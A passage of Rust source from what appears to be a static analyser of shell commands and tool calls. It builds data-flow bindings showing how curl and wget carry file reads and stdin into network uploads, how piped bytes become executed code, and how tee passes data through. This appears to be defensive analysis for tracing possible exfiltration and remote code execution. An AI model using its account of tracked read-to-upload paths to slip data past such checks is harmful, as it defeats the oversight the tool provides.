            binding.assurance = CausalAssurance::Conservative;
        }
    }
    b
}

fn command_bindings_for_stage(builder: &PlanBuilder, spec: &StageSpec) -> Vec<PortBinding> {
    // Executable-file selection replaces a basename model. Do not replay that
    // model's byte bindings over the executable read or its nested effects.
    if (spec.effect_start..spec.effect_end).any(|index| {
        execution_effect(builder, spec.execution, index)
            && builder.effect_operation(index as usize) == Some("process.code_execution")
            && builder.effect_string_attribute(index as usize, "source") == Some("file")
            && builder.effect_has_argument(index as usize, 0)
    }) {
        let mut bindings = Vec::new();
        code_execution_bindings(builder, spec, &mut bindings);
        return bindings;
    }
    let mut b = declarative_bindings(
        builder,
        spec.effect_start,
        spec.effect_end,
        &spec.model_bindings,
    );
    // A sourced file's program is the file, not stdin: only a stdin or
    // descriptor operand makes the piped bytes the sourced code.
    if matches!(spec.name.as_deref(), Some("source" | ".")) {
        b.retain(|binding| {
            !matches!(
                (&binding.from, &binding.to),
                (BindEnd::Port(Port::Stdin), BindEnd::Effect(effect))
                    if builder.effect_string_attribute(*effect as usize, "source") == Some("file")
            )
        });
    }
    if let Some(name) = spec.name.as_deref() {
        if name == "ssh" {
            b.retain(|binding| {
                [&binding.from, &binding.to]
                    .into_iter()
                    .all(|end| binding_end_has_established_network_endpoint(builder, end))
            });
        }
        match name {
            "curl" => curl_bindings(
                builder,
                &spec.words,
                spec.execution,
                spec.effect_start,
                spec.effect_end,
                &spec.redirs,
                &mut b,
            ),
            "wget" => wget_bindings(
                builder,
                &spec.words,
                spec.execution,
                spec.effect_start,
                spec.effect_end,
                &mut b,
            ),
            // tee copies stdin to each file and to stdout; the file writes are not
            // modeled here (tee has no command model), so the pass-through is the
            // load-bearing binding that keeps a pipeline connected through it.
            "tee" => b.push(pass(
                Port::Stdin,
                Port::Stdout,
                CausalAssurance::Conservative,
            )),
            _ => {}
        }
    }
    for write in spec.effect_start..spec.effect_end {
        if stage_effect(builder, spec, write)
            && builder.effect_operation(write as usize) == Some("filesystem.write")
            && builder.effect_execution_command(write as usize) == Some("tee")
        {
            b.push(binding(
                BindEnd::Port(Port::Stdin),
                BindEnd::Effect(write),
                CausalAssurance::Conservative,
            ));
        }
    }
    for index in spec.effect_start..spec.effect_end {
        if environment_stdout_effect(builder, index)
            && (spec.execution == builder.effect_execution(index as usize)
                || spec.execution.is_none()
                    // Builtin listings belong to the shell, not to substitutions
                    // evaluated in their operands within the same effect range.
                    && builder.effect_execution(index as usize)
                        == Some(builder.current_execution())
                    && matches!(
                        spec.name.as_deref(),
                        Some("set" | "export" | "declare" | "typeset")
                    ))
        {
            b.push(binding(
                BindEnd::Effect(index),
                BindEnd::Port(Port::Stdout),
                CausalAssurance::Conservative,
            ));
        }
    }
    code_execution_bindings(builder, spec, &mut b);
    b
}

fn echo_printf_writes_stdout(spec: &StageSpec) -> bool {
    match spec.name.as_deref() {
        Some("echo") => true,
        Some("printf") => {
            spec.words.get(1).and_then(Word::as_literal) != Some("-v")
                || spec.words.get(2).is_none()
        }
        _ => false,
    }
}

/// A file redirected onto the standard input of a builtin that consumes it is
/// that builtin's program input, the way an operand of `cat` is. `read`,
/// `mapfile` and `readarray` are the builtins that read descriptor 0; every
/// other builtin leaves the descriptor untouched (`chmod < file` never reads
/// it), so its redirection stays unmarked.
fn classify_stdin_program_input(
    builder: &mut PlanBuilder,
    spec: &StageSpec,
    fds: &HashMap<Descriptor, Dest>,
) {
    if !matches!(spec.name.as_deref(), Some("read" | "mapfile" | "readarray")) {
        return;
    }
    // `-u FD` moves the input off descriptor 0.
    if spec.words.iter().skip(1).any(|word| {
        word.as_literal().is_some_and(|text| {
            text.starts_with('-') && !text.starts_with("--") && text.contains('u')
        })
    }) {
        return;
    }
    if let Some(Dest::File {
        read_effect: Some(read),
        ..
    }) = fds.get(&Descriptor::Number(0))
    {
        builder.set_effect_string_attribute(*read as usize, "access_purpose", "program_input");
    }
}

fn classify_stdin(builder: &mut PlanBuilder, spec: &StageSpec, interactive: bool) {
    for index in spec.effect_start..spec.effect_end {
        if stage_effect(builder, spec, index)
            && !builder.effect_has_flow_input(index)
            && builder.effect_operation(index as usize) == Some("process.code_execution")
            && matches!(
                builder.effect_string_attribute(index as usize, "source"),
                Some("stdin" | "interactive")
            )
        {
            builder.set_effect_string_attribute(
                index as usize,
                "source",
                if interactive { "interactive" } else { "stdin" },
            );
        }
    }
}

fn declarative_bindings(
    builder: &PlanBuilder,
    start: u32,
    end: u32,
    declarations: &[ModelCausalBinding],
) -> Vec<PortBinding> {
    let mut bindings = Vec::new();
    for declaration in declarations {
        let from = binding_ends(builder, start, end, &declaration.from);
        let to = binding_ends(builder, start, end, &declaration.to);
        for from in &from {
            for to in &to {
                bindings.push(binding(from.clone(), to.clone(), declaration.assurance));
            }
        }
    }
    bindings
}

fn binding_ends(
    builder: &PlanBuilder,
    start: u32,
    end: u32,
    declaration: &ModelBindingEnd,
) -> Vec<BindEnd> {
    match declaration {
        ModelBindingEnd::Port(port) => vec![BindEnd::Port(port.clone())],
        ModelBindingEnd::Effect {
            operation,
            selection,
        } => {
            let mut effects = (start..end)
                .filter(|index| {
                    builder.effect_operation(*index as usize) == Some(operation.as_str())
                })
                .collect::<Vec<_>>();
            match selection {
                EffectSelection::First => effects.truncate(1),
                EffectSelection::Last => {
                    effects = effects.last().copied().into_iter().collect();
                }
                EffectSelection::All => {}
            }
            effects.into_iter().map(BindEnd::Effect).collect()
        }
    }
}

fn binding_end_has_established_network_endpoint(builder: &PlanBuilder, end: &BindEnd) -> bool {
    let BindEnd::Effect(effect) = end else {
        return true;
    };
    if !builder
        .effect_operation(*effect as usize)
        .is_some_and(|operation| operation.starts_with("network."))
    {
        return true;
    }
    builder
        .effect_resource(*effect as usize)
        .is_some_and(established_network_endpoint)
}

fn established_network_endpoint(resource: &ResourceExpr) -> bool {
    match resource {
        ResourceExpr::Concrete {
            identity: ResourceIdentity::NetworkEndpoint { .. },
        }
        | ResourceExpr::Pattern {
            pattern: ResourcePattern::NetworkEndpoint { .. },
        } => true,
        ResourceExpr::Union { alternatives } => {
            !alternatives.is_empty() && alternatives.iter().all(established_network_endpoint)
        }
        _ => false,
    }
}

/// curl: request bodies and header values reach each request, stdin is uploaded
/// only with `@-`/`-T -`, and each response reaches its paired output
/// destination or stdout. Unrelated reads (cacert, cookie file) bind to nothing.
fn curl_bindings(
    builder: &PlanBuilder,
    words: &[Word],
    execution: Option<ExecutionNodeRef>,
    start: u32,
    end: u32,
    redirs: &[Redirection],
    b: &mut Vec<PortBinding>,
) {
    let info = curl_flow_info(words);
    let responses = find_execution_ops_prefix(builder, execution, start, end, "network.");
    // A `.netrc` login upload is its own occurrence beside the request. It
    // carries no body, header or stdin bytes and answers with no response, so
    // it takes no part in the request and response pairing below.
    let routed_responses = responses
        .iter()
        .copied()
        .filter(|effect| {
            builder.effect_string_attribute(*effect as usize, "purpose") != Some("authentication")
        })
        .filter(|effect| {
            builder
                .effect_resource(*effect as usize)
                .is_some_and(established_network_endpoint)
        })
        .collect::<Vec<_>>();
    // curl's FILE protocol answers from the local filesystem, so that read
    // delivers the bytes a network response otherwise would. It is not a
    // request, so request bodies and headers below stay off it.
    let mut deliveries = routed_responses.clone();
    deliveries.extend((start..end).filter(|index| {
        execution_effect(builder, execution, *index)
            && builder.effect_operation(*index as usize) == Some("filesystem.read")
            && info
                .local_file_arguments
                .iter()
                .any(|argument| builder.effect_has_argument(*index as usize, *argument))
    }));
    deliveries.sort_unstable();
    let assurance = if deliveries.len() == 1 {
        info.assurance
    } else {
        CausalAssurance::Conservative
    };
    bind_network_request_sources(
        builder,
        execution,
        start,
        end,
        &info.body_read_arguments,
        &info.header_arguments,
        &routed_responses,
        assurance,
        b,
    );
    for argument in &info.header_read_arguments {
        for read in (start..end).filter(|effect| {
            execution_effect(builder, execution, *effect)
                && builder.effect_operation(*effect as usize) == Some("filesystem.read")
                && builder.effect_has_argument(*effect as usize, *argument)
        }) {
            for upload in routed_responses.iter().copied().filter(|effect| {
                builder.effect_operation(*effect as usize) == Some("network.upload")
            }) {
                b.push(binding(
                    BindEnd::Effect(read),
                    BindEnd::Effect(upload),
                    assurance,
                ));
            }
        }
    }
    if info.stdin_upload {
        for upload in routed_responses
            .iter()
            .copied()
            .filter(|effect| builder.effect_operation(*effect as usize) == Some("network.upload"))
        {
            b.push(binding(
                BindEnd::Port(Port::Stdin),
                BindEnd::Effect(upload),
                assurance,
            ));
        }
    }
    let writes = (start..end)
        .filter(|index| {
            execution_effect(builder, execution, *index)
                && builder.effect_operation(*index as usize) == Some("filesystem.write")
        })
        .filter(|index| {
            !redirs
                .iter()
                .any(|redirection| redirection.write_effect == Some(*index))
        })
        .collect::<Vec<_>>();
    for (response, output) in deliveries.into_iter().zip(
        info.outputs
            .into_iter()
            .chain(std::iter::repeat(CurlFlowOutput::Stdout)),
    ) {
        // An upload occurrence describes outgoing bytes. Its response body
        // needs a separate occurrence before a byte-preserving edge is exact.
        let assurance = if builder.effect_operation(response as usize) == Some("network.upload") {
            CausalAssurance::Conservative
        } else {
            assurance
        };
        match output {
            CurlFlowOutput::Argument(argument) => {
                if let Some(write) = writes
                    .iter()
                    .find(|write| builder.effect_has_argument(**write as usize, argument))
                {
                    b.push(binding(
                        BindEnd::Effect(response),
                        BindEnd::Effect(*write),
                        assurance,
                    ));
                }
            }
            CurlFlowOutput::RemoteName => {
                if let Some(write) = writes.iter().find(|write| {
                    builder.effect_provenance(**write as usize)
                        == builder.effect_provenance(response as usize)
                }) {
                    b.push(binding(
                        BindEnd::Effect(response),
                        BindEnd::Effect(*write),
                        assurance,
                    ));
                }
            }
            CurlFlowOutput::Stdout => {
                b.push(binding(
                    BindEnd::Effect(response),
                    BindEnd::Port(Port::Stdout),
                    assurance,
                ));
            }
        }
    }
}

/// wget request bodies reach one audited request, and a single audited download
/// reaches stdout. Headers and ambiguous command shapes remain conservative.
fn wget_bindings(
    builder: &PlanBuilder,
    words: &[Word],
    execution: Option<ExecutionNodeRef>,
    start: u32,
    end: u32,
    b: &mut Vec<PortBinding>,
) {
    let info = wget_flow_info(words);
    let requests = find_execution_ops_prefix(builder, execution, start, end, "network.");
    let assurance = if requests.len() == 1 {
        info.assurance
    } else {
        CausalAssurance::Conservative
    };
    bind_network_request_sources(
        builder,
        execution,
        start,
        end,
        &info.body_read_arguments,
        &[],
        &requests,
        assurance,
        b,
    );
    for argument in info.body_value_arguments {
        for upload in requests
            .iter()
            .copied()
            .filter(|effect| builder.effect_operation(*effect as usize) == Some("network.upload"))
        {
            b.push(binding(
                BindEnd::Port(Port::Arg(argument)),
                BindEnd::Effect(upload),
                assurance,
            ));
        }
    }
    bind_network_request_sources(
        builder,
        execution,
        start,
        end,
        &[],
        &info.header_arguments,
        &requests,
        CausalAssurance::Conservative,
        b,
    );
    if info.stdout_download {
        for download in requests
            .iter()
            .copied()
            .filter(|effect| builder.effect_operation(*effect as usize) == Some("network.download"))
        {
            b.push(binding(
                BindEnd::Effect(download),
                BindEnd::Port(Port::Stdout),
                assurance,
            ));
        }
    }
    if info.stdin_upload {
        for upload in requests
            .iter()
            .copied()
            .filter(|effect| builder.effect_operation(*effect as usize) == Some("network.upload"))
        {
            b.push(binding(
                BindEnd::Port(Port::Stdin),
                BindEnd::Effect(upload),
                assurance,
            ));
        }
    }
}

#[allow(clippy::too_many_arguments)]
fn bind_network_request_sources(
    builder: &PlanBuilder,
    execution: Option<ExecutionNodeRef>,
    start: u32,
    end: u32,
    body_arguments: &[u32],
    header_arguments: &[u32],
    requests: &[u32],
    assurance: CausalAssurance,
    bindings: &mut Vec<PortBinding>,
) {
    for argument in body_arguments {
        for read in (start..end).filter(|effect| {
            execution_effect(builder, execution, *effect)
                && builder.effect_operation(*effect as usize) == Some("filesystem.read")
                && builder.effect_has_argument(*effect as usize, *argument)
        }) {
            for upload in requests.iter().copied().filter(|effect| {
                builder.effect_operation(*effect as usize) == Some("network.upload")
            }) {
                bindings.push(binding(
                    BindEnd::Effect(read),
                    BindEnd::Effect(upload),
                    assurance,
                ));
            }
        }
    }
    for argument in header_arguments {
        for request in requests {
            bindings.push(binding(
                BindEnd::Port(Port::Arg(*argument)),
                BindEnd::Effect(*request),
                assurance,
            ));
        }
    }
}

fn code_execution_bindings(
    builder: &PlanBuilder,
    spec: &StageSpec,
    bindings: &mut Vec<PortBinding>,
) {
    let reads = (spec.effect_start..spec.effect_end)
        .filter(|index| {
            stage_effect(builder, spec, *index)
                && builder.effect_operation(*index as usize) == Some("filesystem.read")
        })
        .collect::<Vec<_>>();
    for execution in (spec.effect_start..spec.effect_end).filter(|index| {
        stage_effect(builder, spec, *index)
            && !builder.effect_has_flow_input(*index)
            && builder.effect_operation(*index as usize) == Some("process.code_execution")
    }) {
        // A source attribute alone does not prove which input supplies code.
        // File bindings additionally need a model-certified, unique selector.
        let assurance = CausalAssurance::Conservative;
        match builder.effect_string_attribute(execution as usize, "source") {
            Some("stdin") => {
                bindings.push(pass(Port::Stdin, Port::Code, assurance));
                bindings.push(binding(
                    BindEnd::Port(Port::Code),
                    BindEnd::Effect(execution),
                    assurance,
                ));
            }
            Some("file") => {
                let provenance = builder.effect_provenance(execution as usize);
                let mut selected_reads = reads
                    .iter()
                    .copied()
                    .filter(|read| builder.effect_provenance(*read as usize) == provenance);
                let first_read = selected_reads.next();
                let unique_read = first_read.is_some() && selected_reads.next().is_none();
                let unique_sink = !(spec.effect_start..spec.effect_end).any(|other| {
                    other != execution
                        && stage_effect(builder, spec, other)
                        && builder.effect_operation(other as usize)
                            == Some("process.code_execution")
                        && builder.effect_string_attribute(other as usize, "source") == Some("file")
                        && builder.effect_provenance(other as usize) == provenance
                });
                for read in reads
                    .iter()
                    .copied()
                    .filter(|read| builder.effect_provenance(*read as usize) == provenance)
                {
                    let selected = builder.effect_resource(read as usize);
                    let exact = unique_read
                        && unique_sink
                        && builder.effect_request_is_exact(execution as usize)
                        && match (spec.execution, selected, provenance) {
                            (Some(requester), Some(resource), Some(provenance)) => builder
                                .has_unique_direct_main_input(requester, resource, provenance),
                            _ => false,
                        };
                    bindings.push(binding(
                        BindEnd::Effect(read),
                        BindEnd::Effect(execution),
                        if exact {
                            CausalAssurance::Exact
                        } else {
                            assurance
                        },
                    ));
                }
            }
            _ => {}
        }
    }
}

fn environment_stdout_stage(builder: &PlanBuilder, spec: &StageSpec) -> bool {
    (spec.effect_start..spec.effect_end).any(|effect| environment_stdout_effect(builder, effect))
        || echo_printf_writes_stdout(spec)
            && spec
                .argument_producers
                .iter()
                .any(|producers| !producers.is_empty())
            && (0..builder.effects_len() as u32)
                .any(|effect| environment_stdout_effect(builder, effect))
}

pub(crate) fn environment_stdout_effect(builder: &PlanBuilder, index: u32) -> bool {
    builder.effect_operation(index as usize) == Some("environment.read")
        && builder.effect_string_attribute(index as usize, "output") == Some("stdout")
}

/// The stdout-producing effect bindings of a lone command substitution body:
/// for the modeled stdout producers (`cat file...`, `curl url` without an
/// output destination), the effect → stdout bindings over the substitution's
/// effect range. Empty when the command has no unambiguous stdout-producing
/// effect — pass-throughs (tee, base64) need a stdin the substitution lacks.
pub(crate) fn stdout_producer_bindings(
    builder: &PlanBuilder,
    name: &str,
    words: &[Word],
    start: u32,
    end: u32,
    model_bindings: &[ModelCausalBinding],
) -> Vec<PortBinding> {
    let mut b = declarative_bindings(builder, start, end, model_bindings);
    if name == "curl" {
        // The command's execution begins after its argv substitutions, so
        // its process effect is the last one in this substitution range.
        let execution = (start..end).rev().find_map(|index| {
            (builder.effect_operation(index as usize) == Some("process.exec"))
                .then(|| builder.effect_execution(index as usize))
                .flatten()
        });
        curl_bindings(builder, words, execution, start, end, &[], &mut b)
    }
    b.extend(
        (start..end)
            .filter(|index| environment_stdout_effect(builder, *index))
            .map(|index| {
                binding(
                    BindEnd::Effect(index),
                    BindEnd::Port(Port::Stdout),
                    CausalAssurance::Conservative,
                )
            }),
    );
    b.retain(|pb| matches!(pb.from, BindEnd::Effect(_)) && pb.to == BindEnd::Port(Port::Stdout));
    // Declarative stdout bindings retain their assurance. The synthetic curl
    // and environment bindings above are conservative because they establish
    // only that those effects may contribute bytes.
    b
}

fn execution_effect(
    builder: &PlanBuilder,
    execution: Option<ExecutionNodeRef>,
    index: u32,
) -> bool {
    execution.is_some_and(|execution| builder.effect_execution(index as usize) == Some(execution))
}

fn find_execution_ops_prefix(
    builder: &PlanBuilder,
    execution: Option<ExecutionNodeRef>,
    start: u32,
    end: u32,
    prefix: &str,
) -> Vec<u32> {
    (start..end)
        .filter(|i| {
            execution_effect(builder, execution, *i)
                && builder
                    .effect_operation(*i as usize)
                    .is_some_and(|o| o.starts_with(prefix))
        })
        .collect()
}

#[allow(clippy::too_many_arguments)]
pub(crate) fn build_causality(
    subject: &effinterp_proto::Subject,
    effects: &[Effect],
    execution_graph: &effinterp_proto::ExecutionGraph,
    provenance: &[effinterp_proto::ProvenanceNode],
    boundaries: &[Boundary],
    stages: &[FlowStage],
    stage_edges: &[Flow],
    transfer_bindings: &[TransferBinding],
    mut coverage: effinterp_proto::CoverageLevel,
    max_nodes: usize,
    max_edges: usize,
    max_depth: usize,
    max_pairs: usize,
) -> effinterp_proto::Causality {
    use std::collections::{BTreeMap, BTreeSet};

    use effinterp_proto::{
        ByteSpan, CausalCardinality, CausalEdge, CausalReason, CausalityGraph, ExecutionRealm,
        OccurrenceDescriptor, OccurrenceId, OccurrenceKind, OccurrenceNode, ResourceIdentity,
    };

    struct GraphBuilder<'a> {
        input_digest: String,
        provenance: &'a [effinterp_proto::ProvenanceNode],
        nodes: Vec<OccurrenceNode>,
        node_conditions: BTreeMap<OccurrenceId, effinterp_proto::Condition>,
        edges: Vec<CausalEdge>,
        max_nodes: usize,
        max_edges: usize,
        saturated_nodes: bool,
        saturated_edges: bool,
        saturated_conditions: bool,
    }

    impl GraphBuilder<'_> {
        #[allow(clippy::too_many_arguments)]
        fn node(
            &mut self,
            origin: String,
            span: ByteSpan,
            semantic_kind: String,
            occurrence: OccurrenceKind,
            execution: Option<ExecutionNodeRef>,
            realm: ExecutionRealm,
            mut modality: Modality,
            condition: Option<effinterp_proto::Condition>,
            provenance: Vec<ProvenanceRef>,
        ) -> Option<OccurrenceId> {
            if condition
                .as_ref()
                .is_some_and(|condition| condition.is_widened())
            {
                self.saturated_conditions = true;
                modality = Modality::May;
            }
            if self.nodes.len() >= self.max_nodes {
                self.saturated_nodes = true;
                return None;
            }
            let id = OccurrenceId::derive(&OccurrenceDescriptor {
                input_digest: self.input_digest.clone(),
                origin,
                span,
                semantic_kind: match &condition {
                    Some(c) => format!(
                        "{semantic_kind}:{}",
                        effinterp_proto::stable_hash("effinterp/condition/v1", &c.identity())
                    ),
                    None => semantic_kind,
                },
                local_ordinal: self.nodes.len() as u32,
            });
            let order = self.nodes.len() as u32;
            if let Some(condition) = &condition {
                self.node_conditions.insert(id.clone(), condition.clone());
            }
            self.nodes.push(OccurrenceNode {
                id: id.clone(),
                occurrence,
                execution,
                realm,
                modality,
                condition,
                order,
                cardinality: CausalCardinality::from_modality(modality),
                provenance,
            });
            Some(id)
        }

        #[allow(clippy::too_many_arguments)]
        fn edge(
            &mut self,
            from: Option<&OccurrenceId>,
            to: Option<&OccurrenceId>,
            reason: CausalReason,
            mut assurance: CausalAssurance,
            mut modality: Modality,
            condition: Option<effinterp_proto::Condition>,
            provenance: Vec<ProvenanceRef>,
        ) {
            let (Some(from), Some(to)) = (from, to) else {
                return;
            };
            let condition = effinterp_proto::Condition::compose(
                condition
                    .iter()
                    .chain(self.node_conditions.get(from))
                    .chain(self.node_conditions.get(to)),
            );
            if condition
                .as_ref()
                .is_some_and(|condition| condition.is_widened())
            {
                self.saturated_conditions = true;
                modality = Modality::May;
                assurance = CausalAssurance::Conservative;
            }

            if self.edges.len() >= self.max_edges {
                self.saturated_edges = true;
                return;
            }
            self.edges.push(CausalEdge {
                from: from.clone(),
                to: to.clone(),
                reason,
                assurance,
                modality,
                condition,
                order: self.edges.len() as u32,
                cardinality: CausalCardinality::from_modality(modality),
                provenance,
            });
        }

        fn span(&self, roots: &[ProvenanceRef]) -> ByteSpan {
            let mut pending = roots.to_vec();
            let mut seen = BTreeSet::new();
            while let Some(reference) = pending.pop() {
                if !seen.insert(reference) {
                    continue;
                }
                let Some(node) = self.provenance.get(reference.0 as usize) else {
                    continue;
                };
                if let effinterp_proto::ProvenanceKind::SourceSpan { start, end } = node.kind {
                    return ByteSpan { start, end };
                }
                pending.extend(node.antecedents.iter().copied());
            }
            ByteSpan { start: 0, end: 0 }
        }
    }

    impl GraphSink for GraphBuilder<'_> {
        fn simple_edge(
            &mut self,
            from: Option<&OccurrenceId>,
            to: Option<&OccurrenceId>,
            reason: CausalReason,
            modality: Modality,
        ) {
            self.edge(
                from,
                to,
                reason,
                CausalAssurance::Conservative,
                modality,
                None,
                Vec::new(),
            );
        }
    }

    fn edge_modality(a: Modality, b: Modality) -> Modality {
        if a == Modality::MustOnSuccess && b == Modality::MustOnSuccess {
            Modality::MustOnSuccess
        } else {
            Modality::May
        }
    }

    fn conditions(
        a: Option<&effinterp_proto::Condition>,
        b: Option<&effinterp_proto::Condition>,
    ) -> Option<effinterp_proto::Condition> {
        effinterp_proto::Condition::compose(a.into_iter().chain(b))
    }

    fn origin(
        subject: &effinterp_proto::Subject,
        execution_graph: &effinterp_proto::ExecutionGraph,
        execution: Option<ExecutionNodeRef>,
    ) -> String {
        execution
            .and_then(|reference| execution_graph.nodes.get(reference.0 as usize))
            .and_then(|node| node.selected_source_path().map(str::to_string))
            .unwrap_or_else(|| match subject {
                effinterp_proto::Subject::Exec { .. } => "exec".to_string(),
                effinterp_proto::Subject::Shell { .. } => "shell".to_string(),
                effinterp_proto::Subject::Sql { .. } => "sql".to_string(),
                effinterp_proto::Subject::Source { language, .. } => language.clone(),
                effinterp_proto::Subject::ToolCall { call, .. } => call.name().to_string(),
            })
    }

    fn port_key(port: &Port) -> String {
        match &port {
            Port::Stdin => "stdin".to_string(),
            Port::Stdout => "stdout".to_string(),
            Port::Stderr => "stderr".to_string(),
            Port::Code => "code".to_string(),
            Port::Arg(index) => format!("arg:{index}"),
            Port::Value => "value".to_string(),
            Port::Property(name) => format!("property:{name}"),
            Port::Element(index) => format!("element:{index}"),
            Port::HttpRequestBody => "http_request_body".to_string(),
            Port::HttpResponseBody => "http_response_body".to_string(),
            Port::SqlInput => "sql_input".to_string(),
            Port::SqlResult => "sql_result".to_string(),
            Port::ArchiveInput => "archive_input".to_string(),
            Port::ArchiveOutput => "archive_output".to_string(),
        }
    }

    let input_digest = effinterp_proto::canonical_hash(subject)
        .strip_prefix("blake3:")
        .expect("canonical hashes carry the blake3 prefix")
        .to_string();
    let mut graph = GraphBuilder {
        input_digest,
        provenance,
        nodes: Vec::new(),
        node_conditions: BTreeMap::new(),
        edges: Vec::new(),
        max_nodes,
        max_edges,
        saturated_nodes: false,
        saturated_edges: false,
        saturated_conditions: false,
    };

    let mut code_nodes = Vec::with_capacity(execution_graph.nodes.len());
    let mut argument_nodes: BTreeMap<(u32, u32), (OccurrenceId, OccurrenceId)> = BTreeMap::new();
    let mut stream_connections = BTreeMap::new();
    for (index, execution) in execution_graph.nodes.iter().enumerate() {
        let execution_ref = ExecutionNodeRef(index as u32);
        // Resolving the target does not prove that this execution is reached.
        let modality = Modality::May;
        let span = execution
            .source_span
            .unwrap_or(ByteSpan { start: 0, end: 0 });
        let node_origin = origin(subject, execution_graph, Some(execution_ref));
        let code = graph.node(
            node_origin.clone(),
            span,
            format!("execution:{index}:code"),
            OccurrenceKind::Port { port: Port::Code },
            Some(execution_ref),
            execution.realm.clone(),
            modality,
            None,
            execution.evidence.clone(),
        );
        code_nodes.push(code.clone());
        let argument_code: Vec<_> = effects
            .iter()
            .filter(|effect| {
                effect.execution == execution_ref
                    && effect.operation.0 == "process.code_execution"
                    && effect.attributes.get("source")
                        == Some(&AttrValue::String("argument".into()))
            })
            .collect();
        for (arg_index, value) in execution.argv.iter().enumerate() {
            let value_node = graph.node(
                node_origin.clone(),
                span,
                format!("execution:{index}:argument:{arg_index}:value"),
                OccurrenceKind::Value {
                    value: value.clone(),
                },
                Some(execution_ref),
                execution.realm.clone(),
                modality,
                None,
                execution.evidence.clone(),
            );
            let port_node = graph.node(
                node_origin.clone(),
                span,
                format!("execution:{index}:argument:{arg_index}:port"),
                OccurrenceKind::Port {
                    port: Port::Arg(arg_index as u32),
                },
                Some(execution_ref),
                execution.realm.clone(),
                modality,
                None,
                execution.evidence.clone(),
            );
            graph.edge(
                value_node.as_ref(),
                port_node.as_ref(),
                CausalReason::Containment,
                CausalAssurance::Conservative,
                modality,
                None,
                execution.evidence.clone(),
            );
            // A recovered interpreter code operand owns the Code port;
            // other argv words are data even when an executor supplies them.
            if argument_code.is_empty()
                || argument_code.iter().any(|effect| {
                    effect.provenance.iter().any(|reference| {
                        matches!(
                            provenance.get(reference.0 as usize).map(|node| &node.kind),
                            Some(effinterp_proto::ProvenanceKind::Argument { index })
                                if *index == arg_index as u32
                        )
                    })
                })
            {
                graph.edge(
                    port_node.as_ref(),
                    code.as_ref(),
                    CausalReason::ValueDependency,
                    CausalAssurance::Conservative,
                    modality,
                    None,
                    execution.evidence.clone(),
                );
            }
            if let (Some(value_node), Some(port_node)) = (value_node, port_node) {
                argument_nodes.insert((index as u32, arg_index as u32), (value_node, port_node));
            }
        }
    }

    // Nested commands inherit descriptors before the enclosing pipeline is
    // wired. Route inherited stdout through its immediate execution owner so
    // later pipe connections and redirects apply to the nested producer too.
    let mut stdout_parents: BTreeMap<_, _> = execution_graph
        .edges
        .iter()
        .filter(|edge| !edge.cycle)
        .map(|edge| (edge.to.0, edge.from.0))
        .collect();
    let mut disclosure_owners = BTreeSet::new();
    for effect in effects.iter().filter(|effect| {
        effect.operation.0 == "environment.read"
            && matches!(effect.attributes.get("output"), Some(AttrValue::String(output)) if output == "stdout")
    }) {
        let mut execution = effect.execution.0;
        while disclosure_owners.insert(execution) {
            let Some(parent) = stdout_parents.get(&execution) else { break };
            execution = *parent;
        }
    }
    stdout_parents.retain(|execution, _| disclosure_owners.contains(execution));
    let mut required_stream_ports = BTreeSet::new();
    for (index, execution) in execution_graph.nodes.iter().enumerate() {
        if execution.streams.stdin_value.is_some() {
            required_stream_ports.insert((index as u32, Port::Stdin));
        }
        for (local, reference) in [
            (Port::Stdin, execution.streams.stdin.as_ref()),
            (Port::Stdout, execution.streams.stdout.as_ref()),
            (Port::Stderr, execution.streams.stderr.as_ref()),
        ] {
            let Some(reference) = reference else { continue };
            if local == Port::Stdout
                && reference.stream == effinterp_proto::ExecutionStream::Stdout
                && let Some(parent) = stdout_parents.get(&(index as u32))
            {
                required_stream_ports.insert((*parent, Port::Stdout));
            }
            required_stream_ports.insert((index as u32, local));
            required_stream_ports
                .insert((reference.node.0, execution_stream_port(reference.stream)));
        }
    }
    let mut execution_stream_nodes = BTreeMap::new();
    for (execution_index, port) in required_stream_ports {
        let Some(execution) = execution_graph.nodes.get(execution_index as usize) else {
            continue;
        };
        let execution_ref = ExecutionNodeRef(execution_index);
        // Resolving the target does not prove that this execution is reached.
        let modality = Modality::May;
        let id = graph.node(
            origin(subject, execution_graph, Some(execution_ref)),
            execution
                .source_span
                .unwrap_or(ByteSpan { start: 0, end: 0 }),
            format!("execution:{execution_index}:stream:{}", port_key(&port)),
            OccurrenceKind::Port { port: port.clone() },
            Some(execution_ref),
            execution.realm.clone(),
            modality,
            None,
            execution.evidence.clone(),
        );
        if let Some(id) = id {
            execution_stream_nodes.insert((execution_index, port), id);
        }
    }
    for (index, execution) in execution_graph.nodes.iter().enumerate() {
        let Some(value) = &execution.streams.stdin_value else {
            continue;
        };
        let execution_ref = ExecutionNodeRef(index as u32);
        // Resolving the target does not prove that this execution is reached.
        let modality = Modality::May;
        let value_node = graph.node(
            origin(subject, execution_graph, Some(execution_ref)),
            graph.span(&value.provenance),
            format!("execution:{index}:stdin:value"),
            OccurrenceKind::Value {
                value: value.value.clone(),
            },
            Some(execution_ref),
            execution.realm.clone(),
            modality,
            None,
            value.provenance.clone(),
        );
        let stdin_node = execution_stream_nodes.get(&(index as u32, Port::Stdin));
        graph.edge(
            value_node.as_ref(),
            stdin_node,
            CausalReason::Containment,
            CausalAssurance::Conservative,
            modality,
            None,
            value.provenance.clone(),
        );
    }
    for (index, execution) in execution_graph.nodes.iter().enumerate() {
        for (local, reference) in [
            (Port::Stdin, execution.streams.stdin.as_ref()),
            (Port::Stdout, execution.streams.stdout.as_ref()),
            (Port::Stderr, execution.streams.stderr.as_ref()),
        ] {
            let Some(reference) = reference else { continue };
            let local_id = execution_stream_nodes.get(&(index as u32, local.clone()));
            let remote_execution = if local == Port::Stdout
                && reference.stream == effinterp_proto::ExecutionStream::Stdout
            {
                stdout_parents
                    .get(&(index as u32))
                    .copied()
                    .unwrap_or(reference.node.0)
            } else {
                reference.node.0
            };
            let remote_id = execution_stream_nodes
                .get(&(remote_execution, execution_stream_port(reference.stream)));
            let (from, to) = if local == Port::Stdin {
                (remote_id, local_id)
            } else {
                (local_id, remote_id)
            };
            if let (Some(from), Some(to)) = (from, to) {
                let (evidence, exact) = stream_connections
                    .entry((from.clone(), to.clone()))
                    .or_insert_with(|| (Vec::new(), true));
                evidence.extend(execution.evidence.iter().copied());
                *exact &= execution.assurance == effinterp_proto::ExecutionAssurance::Exact
                    && execution_graph.nodes[remote_execution as usize].assurance
                        == effinterp_proto::ExecutionAssurance::Exact;
            }
        }
    }
    for ((from, to), (mut evidence, exact)) in stream_connections {
        evidence.sort_unstable();
        evidence.dedup();
        graph.edge(
            Some(&from),
            Some(&to),
            CausalReason::ValueDependency,
            if exact {
                CausalAssurance::Exact
            } else {
